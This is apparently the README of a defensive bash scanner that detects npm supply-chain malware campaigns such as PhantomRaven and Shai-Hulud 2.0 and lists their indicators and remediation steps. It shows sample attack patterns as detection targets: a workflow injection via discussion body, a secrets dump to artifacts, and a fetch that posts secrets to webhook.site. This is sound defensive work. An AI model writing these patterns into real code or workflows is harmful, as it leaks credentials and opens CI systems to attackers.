# 🛡️ npm-threat-hunter

**A comprehensive shell-based scanner for detecting npm supply chain malware including PhantomRaven, Shai-Hulud 2.0, and similar threats.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Shell Script](https://img.shields.io/badge/shell-bash-green.svg)](https://www.gnu.org/software/bash/)
[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/paoloanzn/npm-threat-hunter)

## 🚨 Supported Attack Campaigns

### 🦅 PhantomRaven (Aug-Oct 2025)

Discovered by [Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies), this campaign:

- Infected **126 malicious npm packages** with over **86,000 downloads**
- Stole npm tokens, GitHub credentials, and CI/CD secrets
- Used **Remote Dynamic Dependencies (RDD)** to hide malicious code
- Remained undetected from **August to October 2025**

### 🪱 Shai-Hulud 2.0 (Nov 2025 - ONGOING)

Discovered by [Wiz Research](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack), this active campaign:

- Compromised **350+ maintainer accounts** including Zapier, ENS Domains, PostHog
- Affected **25,000+ repositories** (growing by ~1,000 every 30 minutes)
- Exploits **GitHub Actions** with self-hosted runner backdoors
- Exfiltrates secrets via artifacts and webhook.site
- Executes during **preinstall phase** for maximum exposure

## 🎯 Why This Scanner?

Most security tools **fail to detect these attacks** because:

| Traditional Tools                     | npm-threat-hunter                           |
| ------------------------------------- | ------------------------------------------- |
| ❌ Static registry analysis only      | ✅ Detects Remote Dynamic Dependencies      |
| ❌ Miss HTTP URLs in dependencies     | ✅ Identifies 150+ known malicious packages |
| ❌ Ignore GitHub Actions threats      | ✅ Scans workflows for injection attacks    |
| ❌ No version-specific detection      | ✅ Flags exact compromised versions         |
| ❌ Can't detect exfiltration patterns | ✅ Deep code analysis for credential theft  |

## 🚀 Quick Start

### Prerequisites

```bash
# Required
sudo apt install jq  # Ubuntu/Debian
brew install jq      # macOS

# Optional (for faster scans)
sudo apt install parallel  # Ubuntu/Debian
brew install parallel      # macOS
```

### Installation

```bash
# Clone the repository
git clone https://github.com/paoloanzn/npm-threat-hunter.git
cd npm-threat-hunter

# Make executable
chmod +x npm-threat-hunter.sh

# Run scan
./npm-threat-hunter.sh /path/to/your/project
```

## 📊 Usage Modes

### 1. Basic Scan (Fast - ~30 seconds)

```bash
./npm-threat-hunter.sh ~/projects
```

Detects:

- Remote Dynamic Dependencies (PhantomRaven)
- Known malicious packages
- Compromised package versions (Shai-Hulud 2.0)
- Shai-Hulud artifact files
- GitHub Actions workflow injections
- Suspicious lifecycle scripts
- Malicious domain references

### 2. Deep Scan (Recommended - ~2-3 minutes)

```bash
./npm-threat-hunter.sh --deep ~/projects
```

Additional checks:

- Credential theft patterns in code
- Suspicious network calls
- Environment variable harvesting
- webhook.site exfiltration detection

### 3. Paranoid Mode (Maximum - ~5 minutes)

```bash
./npm-threat-hunter.sh --paranoid ~/projects
```

Everything plus:

- Installation timing analysis (attack periods)
- System compromise indicators
- ~/.gitconfig and ~/.npmrc forensics
- GitHub self-hosted runner detection

### 4. All Options

```bash
./npm-threat-hunter.sh [OPTIONS] [PATH]

Options:
  --deep         Enable deep code scanning
  --paranoid     Enable all checks including timing analysis
  --verbose      Show detailed output including whitelisted items
  --json         Output results in JSON format
  --dry-run      Show what would be scanned without executing
  --no-cache     Disable signature caching
  --parallel     Use parallel processing (requires GNU parallel)
  --help         Show help message
  --version      Show version information
```

Combine flags as needed:

```bash
./npm-threat-hunter.sh --deep --json --parallel ~/projects > report.json
```

## 🔍 Detection Capabilities

### PhantomRaven Detection

#### Remote Dynamic Dependencies (RDD)

The primary PhantomRaven attack vector:

```json
❌ MALICIOUS
"dependencies": {
  "pkg": "http://packages.storeartifact.com/malware.tgz"
}

✅ SAFE (GitHub - whitelisted)
"dependencies": {
  "test262": "https://github.com/tc39/test262#commit-hash"
}
```

#### Known Malicious Packages

All 126 packages from the PhantomRaven campaign including:

- `unused-imports`
- `eslint-comments`
- `transform-react-remove-prop-types`
- `crowdstrike` (fake package!)
- [See full list](data/malicious-packages.txt)

### Shai-Hulud 2.0 Detection

#### Compromised Package Versions

Detects exact malicious versions:

| Package                     | Compromised Versions   |
| --------------------------- | ---------------------- |
| `@zapier/zapier-sdk`        | 0.15.5, 0.15.6, 0.15.7 |
| `zapier-platform-core`      | 18.0.2, 18.0.3, 18.0.4 |
| `zapier-platform-cli`       | 18.0.2, 18.0.3, 18.0.4 |
| `@zapier/mcp-integration`   | 3.0.1, 3.0.2, 3.0.3    |
| `@ensdomains/ensjs`         | 4.0.3                  |
| `@ensdomains/ens-contracts` | 1.6.1                  |
| `ethereum-ens`              | 0.8.1                  |
| `@posthog/agent`            | 1.24.1                 |

Plus entire compromised namespaces:

- `@trigo/*`
- `@orbitgtbelgium/*`
- `@louisle2/*`

#### Shai-Hulud Artifact Files

Detects malware payload files:

| File                  | Purpose                        |
| --------------------- | ------------------------------ |
| `setup_bun.js`        | Payload loader                 |
| `bun_environment.js`  | Environment stealer            |
| `cloud.json`          | Exfiltrated cloud credentials  |
| `contents.json`       | Stolen repository contents     |
| `environment.json`    | Captured environment variables |
| `truffleSecrets.json` | Harvested secrets              |

#### GitHub Actions Exploitation

Scans workflows for:

```yaml
# 🚨 BACKDOOR PATTERN - Self-hosted runner with discussion trigger
name: Discussion Create
on:
  discussion:
jobs:
  process:
    runs-on: self-hosted # ← Targets compromised runners
    steps:
      - run: echo ${{ github.event.discussion.body }} # ← Command injection!
```

```yaml
# 🚨 SECRET EXFILTRATION - Dumps all secrets
env:
  DATA: ${{ toJSON(secrets) }} # ← Enumerates ALL secrets
steps:
  - uses: actions/upload-artifact@v5 # ← Exfiltrates via artifacts
```

Specific patterns detected:

- `discussion.yaml` backdoor workflows
- `formatter_*.yml` secret exfiltration
- Self-hosted runner registration as "SHA1HULUD"
- `toJSON(secrets)` enumeration
- Unsafe `echo ${{ github.event.* }}` injection

### Deep Scan Features (--deep)

#### Credential Theft Patterns

Searches for:

- `process.env.NPM_TOKEN`
- `process.env.GITHUB_TOKEN`
- `process.env.GH_TOKEN`
- `process.env.GITLAB_TOKEN`
- `.gitconfig` / `.npmrc` access

#### Network Exfiltration

Detects suspicious outbound connections:

```javascript
// 🚨 FLAGGED - Known exfiltration endpoint
fetch("https://webhook.site/xxx", {
  method: "POST",
  body: JSON.stringify(secrets),
});
```

### Paranoid Mode Features (--paranoid)

#### Timeline Analysis

Flags packages installed during active attack periods:

- **PhantomRaven**: August 1 - October 31, 2025
- **Shai-Hulud 2.0**: November 21 - present, 2025

#### System Forensics

- Checks `~/.gitconfig` modification timestamps
- Validates `~/.npmrc` for exposed tokens
- Scans environment for leaked secrets
- Detects GitHub self-hosted runners named "SHA1HULUD"

## 📊 Understanding Results

### Exit Codes

| Code | Status      | Action                                       |
| ---- | ----------- | -------------------------------------------- |
| `0`  | ✅ Clean    | No threats detected                          |
| `1`  | 🚨 CRITICAL | Malware detected - immediate action required |
| `2`  | ⚠️ WARNING  | Suspicious indicators - review carefully     |

### Example: Clean System

```
═══════════════════════════════════════════════════════════
                    SCAN RESULTS
═══════════════════════════════════════════════════════════

Summary:
├─ Remote Dynamic Dependencies: 0
├─ Known Malicious Packages: 0
├─ Compromised Versions: 0
├─ Shai-Hulud Artifacts: 0
├─ Workflow Injections: 0
├─ Suspicious Lifecycle Scripts: 2
├─ Credential Theft Patterns: 0
└─ Suspicious Network Calls: 0

═══════════════════════════════════════════════════════════
✓ No critical threats detected

Your npm projects appear clean based on known indicators for:
  - PhantomRaven (Aug-Oct 2025)
  - Shai-Hulud 2.0 (Nov 2025+)
```

### Example: Shai-Hulud 2.0 Detected

```
═══════════════════════════════════════════════════════════
🪱 Compromised Package Versions:
════════════════════════════════════════
[CRITICAL] @zapier/zapier-sdk@0.15.6
  File: project/package.json
  Campaign: SHAI_HULUD_2

🪱 GitHub Actions Workflow Issues:
════════════════════════════════════════
[CRITICAL] discussion+self-hosted
  File: .github/workflows/discussion.yaml
  Issue: Backdoor pattern

═══════════════════════════════════════════════════════════
🚨 CRITICAL: MALWARE DETECTED!

Campaign Detected: SHAI-HULUD 2.0

IMMEDIATE ACTIONS REQUIRED:
1. DO NOT run npm install
2. Disconnect this machine from network
3. Rotate ALL credentials immediately
...

SHAI-HULUD 2.0 SPECIFIC ACTIONS:
6. Check GitHub for self-hosted runners named 'SHA1HULUD'
7. Review .github/workflows for discussion.yaml or formatter_*.yml
8. Audit GitHub Discussions for suspicious content
9. Check for exfiltration to webhook.site
10. Review Actions artifacts for secret dumps
```

## 🛠️ CI/CD Integration

### GitHub Actions

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  npm-threat-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install jq
        run: sudo apt-get install -y jq

      - name: Run npm-threat-hunter
        run: |
          chmod +x npm-threat-hunter.sh
          ./npm-threat-hunter.sh --deep .

      - name: Upload report
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: threat-scan-report
          path: scan-report.json
```

### GitLab CI

```yaml
npm-threat-scan:
  stage: test
  image: ubuntu:latest
  before_script:
    - apt-get update && apt-get install -y jq
  script:
    - chmod +x npm-threat-hunter.sh
    - ./npm-threat-hunter.sh --deep .
  allow_failure: false
```

### Pre-commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

if [ -f "package.json" ]; then
    ./npm-threat-hunter.sh --deep . || exit 1
fi
```

### Scan Multiple Projects

```bash
for dir in ~/projects/*/; do
    echo "Scanning $dir"
    ./npm-threat-hunter.sh --deep "$dir"
done
```

## 🔒 Immediate Remediation

### If Malware IS Detected

#### 1. Isolate Immediately

```bash
# Disconnect from network
sudo ip link set eth0 down  # Linux
sudo ifconfig en0 down      # macOS
```

#### 2. Check What Was Stolen

```bash
cat ~/.gitconfig
cat ~/.npmrc
env | grep -E '(TOKEN|SECRET|KEY|PASSWORD)'
```

#### 3. Rotate ALL Credentials

| Service | Action                                          |
| ------- | ----------------------------------------------- |
| GitHub  | https://github.com/settings/tokens → Revoke all |
| npm     | `npm token list` → `npm token revoke <id>`      |
| CI/CD   | Update all secrets in Actions/GitLab/Jenkins    |
| Cloud   | Rotate AWS/GCP/Azure credentials                |

#### 4. Clean Rebuild

```bash
# Clear npm cache
npm cache clean --force

# Remove all node_modules
rm -rf node_modules
find ~/projects -name "node_modules" -type d -exec rm -rf {} +

# Remove lock files
rm package-lock.json

# Reinstall with scripts disabled
npm install --ignore-scripts

# Pin to safe versions (pre-Nov 21, 2025 for Shai-Hulud affected packages)
```

#### 5. Shai-Hulud Specific Cleanup

```bash
# Check for malicious self-hosted runners
gh api user/repos --jq '.[].full_name' | while read repo; do
  gh api "repos/$repo/actions/runners" 2>/dev/null | grep -q "SHA1HULUD" && echo "INFECTED: $repo"
done

# Remove malicious workflows
rm -f .github/workflows/discussion.yaml
rm -f .github/workflows/formatter_*.yml

# Check for artifact exfiltration
gh run list --json databaseId,name | jq '.[] | select(.name | contains("format"))'
```

### Prevention Best Practices

```bash
# 1. Use lock files with integrity checks
npm ci  # instead of npm install

# 2. Disable auto-script execution
echo "ignore-scripts=true" >> ~/.npmrc

# 3. Regular scanning
./npm-threat-hunter.sh --deep ~/projects

# 4. Audit before adding packages
npm audit
npm view <package-name> dependencies

# 5. Verify AI-suggested packages
# Never blindly trust Copilot/ChatGPT package recommendations

# 6. Use scoped, short-lived tokens
# Never use long-lived PATs in CI/CD
```

## 📁 Data Files

The scanner uses external data files in `data/`:

```
data/
├── malicious-packages.txt   # Known malicious npm packages (150+)
├── malicious-domains.txt    # C2 and exfiltration domains
├── safe-domains.txt         # Whitelisted domains for RDD
├── safe-packages.txt        # Packages with legitimate install scripts
└── ioc-artifacts.txt        # IOC patterns (files, workflows, versions)
```

### Updating Signatures

Simply edit the text files to add new IOCs:

```bash
# Add new malicious package
echo "new-malicious-pkg" >> data/malicious-packages.txt

# Add new malicious domain
echo "evil-domain.com" >> data/malicious-domains.txt

# Force reload (bypass cache)
./npm-threat-hunter.sh --no-cache ~/projects
```

### IOC Artifact Format

```
TYPE|PATTERN|DESCRIPTION|CAMPAIGN

Examples:
FILE|setup_bun.js|Shai-Hulud payload loader|SHAI_HULUD_2
WORKFLOW|discussion.yaml|Backdoor workflow|SHAI_HULUD_2
VERSION|@zapier/zapier-sdk|0.15.5,0.15.6,0.15.7|SHAI_HULUD_2
NAMESPACE|@trigo/|Compromised publisher|SHAI_HULUD_2
```

## 🧪 False Positives

The scanner intelligently whitelists known-safe patterns:

### Safe Domains

- `github.com`
- `gitlab.com`
- `bitbucket.org`

### Safe Packages with Install Scripts

- `esbuild` - JavaScript bundler
- `@swc/core` - TypeScript/JavaScript compiler
- `cypress`, `puppeteer`, `playwright` - Testing frameworks
- `electron` - Desktop app framework

### Handling False Positives

Add to whitelist files:

```bash
# Safe domain
echo "your-internal-registry.com" >> data/safe-domains.txt

# Safe package with install scripts
echo "your-internal-package" >> data/safe-packages.txt
```

## 🤝 Contributing

Contributions welcome!

1. Fork the repository
2. Create a feature branch
3. Add tests for new detections
4. Submit a pull request

### Adding New Campaign Support

1. Add packages to `data/malicious-packages.txt`
2. Add domains to `data/malicious-domains.txt`
3. Add IOCs to `data/ioc-artifacts.txt`
4. Update detection functions if new techniques needed

## 📚 Resources

### Attack Research

- [Shai-Hulud 2.0 - Wiz Blog](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack)
- [PhantomRaven - Koi Security](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
- [Aikido Security Analysis](https://www.aikido.dev/blog/cutting-through-the-noise-what-packages-were-actually-compromised-by-the-polyfill-attack)

### Security Best Practices

- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Socket.dev - Supply Chain Security](https://socket.dev/blog)

## ⚖️ License

MIT License - See [LICENSE](LICENSE) file

## ⚠️ Disclaimer

This tool is provided for defensive security purposes only. Use responsibly and in accordance with applicable laws and regulations. The authors are not responsible for misuse or damage caused by this tool.

## 🙏 Credits

- **Wiz Research** - For discovering Shai-Hulud 2.0 and rapid disclosure
- **Koi Security & Oren Yomtov** - For the original PhantomRaven research
- **Aikido Security** - For additional analysis and confirmation
- **npm Security Team** - For rapid response in removing malicious packages
- **Open Source Community** - For maintaining secure package ecosystems

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/paoloanzn/npm-threat-hunter/issues)
- **Security**: Report vulnerabilities privately via GitHub Security Advisories

---

**Stay safe! Scan often. Trust but verify.** 🛡️

_Last updated: December 2025 | Version 2.0.0_
